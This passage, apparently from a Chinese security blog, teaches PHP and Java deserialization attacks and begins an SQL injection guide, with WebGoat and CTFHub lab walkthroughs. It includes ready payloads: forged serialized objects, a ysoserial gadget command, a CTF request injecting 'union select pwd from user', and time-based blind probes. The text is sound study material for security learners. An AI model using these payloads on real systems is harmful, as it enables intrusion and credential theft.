<p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p>
<p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p>
</li>
</ul>
</li>
<li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p>
<p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p>
<ul>
<li>方法：<strong>条件竞争</strong></li>
</ul>
</li>
</ul>
<p><strong>当 session.auto_start＝On 时：</strong></p>
<p>如果 session.auto_start＝On ，就会自动注册 session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此我们需要 <strong>在脚本中设置 序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话</strong>，然后再设置需要的序列化处理器，那么第一次我们所使用的就是我们自己设置的存储器，而第二次执行时，系统仍会自动调用 session_start() 函数注册会话，这时所使用的就是默认的存储引擎了。</p>
<p>所以，如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p>
<p>已知：默认的存储引擎是 php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) &#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>第一次访问脚本 ，传入参数 <code>?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>，脚本将会按照 php_serialize 处理数据，得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>第二次访问，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）。</p>
<p><strong>当 session.auto_start＝Off 时：</strong></p>
<p>两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问 foo1.php 提交数据 ?a=|O:1:”a”:1:{s:2:”hi”;s:7:”success”;}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>再访问 foo2.php ，成功</p>
<p><img src="https://i.loli.net/2021/09/12/9BrpshRMXJCjGUz.png" alt="image-20210912112309204"></p>
<p>由于 访问 foo1 时，传入的数据将会使用 php_serialize 进行序列化，然后再访问 foo2 时，程序将会使用 php 引擎来反序列化 session 中是之举，从而实例化 a 对象，而执行其中的魔术方法。</p>
<p><strong>补充：</strong></p>
<p>为什么在 解析 session 文件时为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</p>
<blockquote>
<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p>
</blockquote>
<h3 id="3-6-4-CTF-题目"><a href="#3-6-4-CTF-题目" class="headerlink" title="3.6.4 CTF 题目"></a>3.6.4 CTF 题目</h3><h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><ul>
<li><p>序列化后的结果是一串字符串。</p>
</li>
<li><p>反序列化会解开序列化的字符串生成相应类型的数据。</p>
</li>
</ul>
<p>如下代码示例，img是一个数组，下标分别是one和two，对应的值分别是flag,test。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img[&#x27;one&#x27;] = &quot;flag&quot;;</span><br><span class="line">$img[&#x27;two&#x27;] = &quot;test&quot;;</span><br><span class="line">$a = serialize($img);</span><br><span class="line">var_dump($a);</span><br><span class="line">#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">/*输出如下内容:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;one&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;two&quot;]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p><strong>序列化部分</strong>:</p>
<p>经过serialize序列化后生成了相应的字符串: a:2:{s:3:”one”;s:4:”flag”;s:3:”two”;s:4:”test”;}</p>
<p>a表示数组 , a:2中的2表示有两个键值，即对应的one、two两组键值对。</p>
<p>花括号中的s都表示string即字符串，</p>
<p>s:后面的值分别是3、4、3、4,即对应的字符串长度，比如one长度是三，flag长度是4</p>
<p><strong>反序列化部分:</strong></p>
<p>unserialize函数将字符串解序列化，我们用var_dump函数显示了他的详细信息。</p>
<p>可见解序列化后由变量$b，接收了img数组。</p>
<h3 id="序列化中每个字母的表示"><a href="#序列化中每个字母的表示" class="headerlink" title="序列化中每个字母的表示"></a>序列化中每个字母的表示</h3><table>
<thead>
<tr>
<th align="left">a</th>
<th align="left">array数组</th>
</tr>
</thead>
<tbody><tr>
<td align="left">b</td>
<td align="left">boolean判断类型</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">double浮点数</td>
</tr>
<tr>
<td align="left">i</td>
<td align="left">integer整数型</td>
</tr>
<tr>
<td align="left">o</td>
<td align="left">common object 一般的对象</td>
</tr>
<tr>
<td align="left">r</td>
<td align="left">reference引用类型</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">string字符串类型</td>
</tr>
<tr>
<td align="left">C</td>
<td align="left">custom object</td>
</tr>
<tr>
<td align="left">O</td>
<td align="left">class</td>
</tr>
<tr>
<td align="left">N</td>
<td align="left">null</td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">pointer reference</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">unicode string</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发 </span><br><span class="line">__sleep() 	//使用serialize时触发 </span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call()    //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() //用于从不可访问的属性读取数据 </span><br><span class="line">__set() //用于将数据写入不可访问的属性 </span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() //在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发 <span class="built_in">echo</span> 对象; <span class="variable">$text</span>=<span class="variable">$test</span>+$对象； </span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span><br></pre></td></tr></table></figure>



<h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><p>SQL注入</p>
<p>代码执行</p>
<p>目录遍历</p>
<h1 id="四、JAVA-反序列化"><a href="#四、JAVA-反序列化" class="headerlink" title="四、JAVA 反序列化"></a>四、JAVA 反序列化</h1><p>序列化：将对象的状态信息转换为可以存储或者传输的形式的过程。序列化期间，对象将其当前的状态写入到临时或持久型储存区。</p>
<p>反序列化：从储存区读取到数据，将其还原为对象</p>
<p><strong>好处：</strong></p>
<ul>
<li>把对象的字节序列永久地保存到硬盘上，实现对象的持久化，通常存放在一个文件中；</li>
<li>利用序列化实现远程通信，即在网络上传递对象的字节序列。</li>
</ul>
<p><strong>实例理解</strong></p>
<blockquote>
<p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。</p>
<p>于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p>
<hr>
<p>我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。</p>
<p>同样的序列化与反序列化则实现了 <strong>进程通信间的对象传送</strong>，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。</p>
</blockquote>
<p><strong>JDK 类库中序列化 API</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//序列化:对参数指定的obj对象进行序列化，将字节序列写入到一个目标输出流中</span></span><br><span class="line">ObjectOutputStream类 writeObject()</span><br><span class="line"><span class="comment">//反序列化:从一个源输入流中读取字节序列，把他们反序列化为一个对象，将其返回</span></span><br><span class="line">ObjectIntputStream类 readObject()</span><br></pre></td></tr></table></figure>

<p><strong>工具</strong>    <a href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p>
<p><strong>WebGoat</strong>    <a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0</span><br><span class="line">docker images</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0</span><br><span class="line">http://192.168.158.111:8080/WebGoat/login</span><br></pre></td></tr></table></figure>

<h2 id="4-1-WebGoat"><a href="#4-1-WebGoat" class="headerlink" title="4.1 WebGoat"></a>4.1 WebGoat</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</span><br><span class="line">即序列化+base64加密</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/15/bMn8ex1dK7QRVPD.png" alt="image-20210504171938337"></p>
<p><strong>命令执行 + 反弹 shell(以免不会回显)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#思路:以 执行 ipconfig 命令为例</span></span><br><span class="line">ipconfig --&gt; 序列化 --&gt; base64加密 --&gt; 最终转换成以rO0AB格式开头的字符串作为我们的payload</span><br></pre></td></tr></table></figure>

<p><strong>工具形成 payload</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure>

<p>再将生成的 payload.bin 进行一个base64加密：使用python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;payload.bin路径&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cc = base64.urlsafe_b64encode(c)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;wt&quot;</span>,ecoding=<span class="string">&quot;utf-8&quot;</span>).write(cc.decode())</span><br></pre></td></tr></table></figure>

<h2 id="4-2-CTFHUB-—-think-java"><a href="#4-2-CTFHUB-—-think-java" class="headerlink" title="4.2 CTFHUB —- think_java"></a>4.2 CTFHUB —- think_java</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /common/test/sqlDict HTTP/1.1</span><br><span class="line">Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">dbName=myapp?a=&#x27; union select (select pwd from user)#</span><br></pre></td></tr></table></figure>

<p>SQL注入获取用户账号吗和密码</p>
<p>登陆成功</p>
<p>对方回显数据：一段 ro0AB开头的数据</p>
<p>先进行base64解密</p>
<p>使用serializationDumper工具进行解析反序列话的数据</p>
<p>java -jar SerializationDumper.jar base64</p>
<p><img src="https://i.loli.net/2021/09/15/jJ5y4FCiGpXvRWZ.png" alt="image-20210504180422065"></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
<p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p>
<p><img src="https://i.loli.net/2021/09/15/3iUZ8msAvRtHIjb.png" alt="image-20210504155703612"></p>
]]></content>
      <categories>
        <category>WEB漏洞详解</category>
      </categories>
      <tags>
        <tag>序列化与反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入全解</title>
    <url>/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h1 id="SQL-注入全解"><a href="#SQL-注入全解" class="headerlink" title="SQL 注入全解"></a>SQL 注入全解</h1><p><a href="https://www.cnblogs.com/csnd/p/11807596.html#%E4%B8%83%EF%BC%9AREGEXP%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D">SQL 注入 详解</a></p>
<h2 id="一、注入分类"><a href="#一、注入分类" class="headerlink" title="一、注入分类"></a>一、注入分类</h2><ul>
<li><p><strong>注入点分类</strong></p>
<ul>
<li>数字型注入</li>
<li>字符型注入：单引号，双引号，加括号等等</li>
</ul>
</li>
<li><p><strong>提交方式分类</strong></p>
<ul>
<li>GET 方式注入</li>
<li>POST 方式注入</li>
<li>COOKIE 方式注入</li>
<li>HTTP 头部注入：XFF，UA，REFRERE</li>
</ul>
</li>
<li><p><strong>是否回显</strong></p>
<ul>
<li><p>联合查询</p>
</li>
<li><p>布尔盲注</p>
</li>
<li><p>报错注入</p>
</li>
<li><p>时间盲注</p>
</li>
<li><p>二次注入</p>
</li>
<li><p>堆叠查询（同时执行多条语句）</p>
</li>
</ul>
</li>
</ul>
<h2 id="二、注入判断"><a href="#二、注入判断" class="headerlink" title="二、注入判断"></a>二、注入判断</h2><ol>
<li><p><strong>工具扫描</strong>：网站漏扫工具，AWVS、AppScan、OWASP-ZAP、Nessus等</p>
</li>
<li><p><strong>手动测试：</strong></p>
<ul>
<li><p>单双引号，括号，进行组合测试，看是否报错</p>
</li>
<li><p><strong>对于数字型</strong>   <code>?id=3-1</code>  <code>?id=2#</code></p>
<p>如果显示的是 <code>?id=2</code> 时的正常页面，就说明我们所写的表达式进行了正确运算，可判断注入点是 数字型注入；如果返回不正常，则可能是非数字型注入。</p>
</li>
<li><p><strong>对于字符型</strong>   <code>?id=2a</code>   <code>?id=2&#39;#</code></p>
<p>Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时，首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 弱类型比较 ==。</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/08/19/2NOpAGDxYnlS9tJ.png" alt="image-20210819204302057"></p>
<ul>
<li><p><strong>对于布尔盲注</strong>   </p>
<p> <code>?id=1&#39; and &#39;1</code>        <code>?id=1&#39; and &#39;a</code></p>
<p>这里没有使用注释符号进行后面的单引号闭合，使用的是手工单引号闭合</p>
<p>或者，</p>
<p><code>?id=1&#39; and 1=1#</code>      <code>?id=1&#39; and 1=2#</code></p>
<p>两者的页面截然不同，一个正常回显，一个没有回显的话，就可判断是布尔盲注。</p>
</li>
<li><p><strong>对于 时间盲注</strong></p>
<p><code>?id=1&#39; and sleep(3)#</code>  ，类似的有以下几种</p>
<p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p>
<p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。</p>
<table>
<thead>
<tr>
<th>MySQL</th>
<th>benchmark(100000000,md(5))                              sleep(3)</th>
</tr>
</thead>
<tbody><tr>
<td>PostgreSQL</td>
<td>PG_sleep(5)                                                                  Generate_series(1,1000000)</td>
</tr>
<tr>
<td>SQLServer</td>
<td>waitfor delay ‘0:0:5’在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</td>
</tr>
</tbody></table>
</li>
<li><p>在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</p>
</li>
</ul>
</li>
<li><p><strong>常见 SQL 注入功能点</strong></p>
<p>只要是存在数据库交互的地方都有可能出现 SQL 注入。</p>
<p>常出现在 登录页面、订单页面、文章或新闻展示页面、修改密码页面（二次注入）、涉及获取 HTTP 头（XFF等）的功能点等。</p>
</li>
<li><p><strong>注释：–+    #</strong></p>
</li>
<li><p><strong>闭合方法：注释闭合、手动闭合 and ‘1</strong></p>
</li>
</ol>
<h2 id="三、Mysql-注入"><a href="#三、Mysql-注入" class="headerlink" title="三、Mysql 注入"></a>三、Mysql 注入</h2><h3 id="3-1-必备"><a href="#3-1-必备" class="headerlink" title="3.1 必备"></a>3.1 必备</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">注释：</span><br><span class="line">#   </span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"><span class="comment">/*!......*/</span></span><br></pre></td></tr></table></figure>

<p><strong>元数据库 information_schema</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">元数据库 information_schema 中：</span><br><span class="line"></span><br><span class="line">存放数据库信息的表：schemata</span><br><span class="line">schemata 表中</span><br><span class="line">字段 schema_name 存放所有数据库名；</span><br><span class="line"></span><br><span class="line">存放表信息的表：tables</span><br><span class="line">tables 表中</span><br><span class="line">字段 table_name 存放所有表名</span><br><span class="line">字段 table_schema 存放所有表所在的数据库名；</span><br><span class="line"></span><br><span class="line">存放所有字段信息的表：columns</span><br><span class="line">columns 表中</span><br><span class="line">字段 column_name 存放所有字段名，</span><br><span class="line">字段 table_name 存放所有字段所在的表名，</span><br><span class="line">字段 table_schema 存放所有字段所在的数据库名；</span><br></pre></td></tr></table></figure>

<p><strong>语句分类：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>DQL(数据查询语言)：查询语句，所有的 <span class="keyword">select</span> 语句</span><br><span class="line"><span class="number">2.</span>DML(数据操作语言)：<span class="keyword">insert</span> , <span class="keyword">delete</span> , update , 对表中的 数据 进行 增删改</span><br><span class="line"><span class="number">3.</span>DDL(数据定义语言)：<span class="keyword">create</span> , <span class="keyword">drop</span> , <span class="keyword">alter</span> 对表 结构 的 增删改</span><br><span class="line"><span class="number">4.</span>TCL(事务控制语言)：<span class="keyword">commit</span> 提交数据，<span class="keyword">rollback</span> 回滚数据 Transaction</span><br><span class="line"><span class="number">5.</span>DCL(数据控制语言)：<span class="keyword">grant</span> 授权，<span class="keyword">revoke</span> 撤销权限等</span><br></pre></td></tr></table></figure>

<p><strong>基本语句：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查库：</span><br><span class="line"><span class="keyword">show</span> databases；</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata；</span><br><span class="line"># 建库：</span><br><span class="line"><span class="keyword">create</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 删库：</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">+</span> 库名;</span><br><span class="line"># 进入数据库：</span><br><span class="line">use <span class="operator">+</span> 库名；</span><br><span class="line"></span><br><span class="line"># 查表：</span><br><span class="line"><span class="keyword">show</span> tables；</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>；</span><br><span class="line"># 查列：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users；</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>；</span><br><span class="line"># 查字段：</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> security.users；</span><br></pre></td></tr></table></figure>

<p><strong>基本函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#数据库安装、路径，用户 信息</span><br><span class="line">version();            Mysql 数据库版本</span><br><span class="line">database();           当前 数据库名</span><br><span class="line"><span class="keyword">user</span>();               数据库的用户名</span><br><span class="line"><span class="built_in">current_user</span>();       当前用户名</span><br><span class="line"><span class="built_in">session_user</span>();		  连接到数据库的用户名</span><br><span class="line"><span class="built_in">system_user</span>();        系统用户名</span><br><span class="line">@<span class="variable">@datadir</span>();          数据库文件的存放路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os; 操作系统版本</span><br><span class="line">@<span class="variable">@basedir</span>;			  数据库的安装目录</span><br><span class="line"></span><br><span class="line">#字符串长度、截取</span><br><span class="line">length();             返回字符串的长度</span><br><span class="line"><span class="built_in">substring</span>(a,b,c);     截取字符串</span><br><span class="line">substr(a,b,c);  </span><br><span class="line">mid(a,b,c);  </span><br><span class="line">三个参数：a.截取的字符串 b.截取的起始位置 c.长度</span><br><span class="line"><span class="keyword">left</span>(a,b);            从左侧截取a的前b位，正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br><span class="line"></span><br><span class="line">#字符串配对连接</span><br><span class="line">concat(a,<span class="number">0x5e</span>,b);     字符串配对连接</span><br><span class="line">concat_ws(<span class="string">&#x27;~&#x27;</span>,A,B);   含有分隔符的连接字符串</span><br><span class="line">group_concat();       将字符串连接为一个组，可将不同列分到同一行中</span><br><span class="line"></span><br><span class="line">#字符串特殊处理</span><br><span class="line">ord();                返回ASCII码</span><br><span class="line">ascii(<span class="string">&#x27;a&#x27;</span>);           将字母 a 转换为ascii值</span><br><span class="line">rand();               返回<span class="number">0</span><span class="operator">~</span><span class="number">1</span>之间的随机浮点数</span><br><span class="line">round();              返回最近的整数值</span><br><span class="line">md5();                返回MD5值</span><br><span class="line">hex();                将字符串转换为十六进制</span><br><span class="line">unhex();              hex()的反向操作</span><br><span class="line"><span class="built_in">floor</span>(x);             返回不大于x的最大整数</span><br><span class="line">load_file();          读取文件，返回文件内容作为一个字符串</span><br><span class="line">sleep(a);             沉睡a秒</span><br><span class="line">if(<span class="literal">true</span>,t,f);         判断语句为<span class="literal">true</span> ,执行第一个，否则第二个</span><br><span class="line">find_in_set();        返回字符串在字符串列表中的位置</span><br><span class="line">benchmark();          指定语句执行的次数</span><br><span class="line">name_const();         返回表作为结果</span><br></pre></td></tr></table></figure>

<p><strong>导入数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">当希望导入一个 较大 的文件或者是想要批量的执行<span class="keyword">sql</span>语句时，可以使用 mysql 中的 source 命令</span><br><span class="line">使用方法：source <span class="operator">+</span> 文件路径(直接拖拽)</span><br></pre></td></tr></table></figure>

<h3 id="3-2-语句"><a href="#3-2-语句" class="headerlink" title="3.2 语句"></a>3.2 语句</h3><p><strong>mysql 对 表的结构的更改语句</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># create</span></span><br><span class="line">create table 表名(</span><br><span class="line">     字段名1，数据类型，</span><br><span class="line">     字段名2，数据类型，</span><br><span class="line">     字段名3，数据类型，</span><br><span class="line">     ......</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># insert</span></span><br><span class="line">insert into 表名(字段名1，字段名2，字段名3......) values(值1，值2，值3......)；</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete</span></span><br><span class="line">delete from 表名 <span class="built_in">where</span> 条件;//可回滚</span><br><span class="line">对于大表：</span><br><span class="line">truncate table 表名;//不可回滚，将会永久丢失</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">update 表名 <span class="built_in">set</span> 字段名1=值1,字段名2=值2,......<span class="built_in">where</span> 条件；</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改表名称：</span></span><br><span class="line">语法一： alter table tbl_name rename[to|as] new_tbl_name						--可以更改一张数据表名称</span><br><span class="line">语法二：rename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namew……	--可以多表更改名称</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加表列</span></span><br><span class="line">alter table <span class="built_in">test</span> add column name varchar(10); </span><br><span class="line"></span><br><span class="line"><span class="comment">#删除表列</span></span><br><span class="line">alter table <span class="built_in">test</span> drop column name; </span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列类型</span></span><br><span class="line">alter table <span class="built_in">test</span> modify address char(10) </span><br><span class="line">||alter table <span class="built_in">test</span> change address address char(40)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改表列名</span></span><br><span class="line">alter table <span class="built_in">test</span> change column address address1 varchar(30)</span><br></pre></td></tr></table></figure>

<p><strong>常用字段</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，...... <span class="keyword">from</span> <span class="operator">+</span> 表名 <span class="keyword">where</span> <span class="operator">+</span> 条件;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">between</span> <span class="keyword">and</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">8</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;=</span><span class="number">2</span> <span class="keyword">and</span> id <span class="operator">&lt;=</span><span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">in</span>   <span class="keyword">not</span> <span 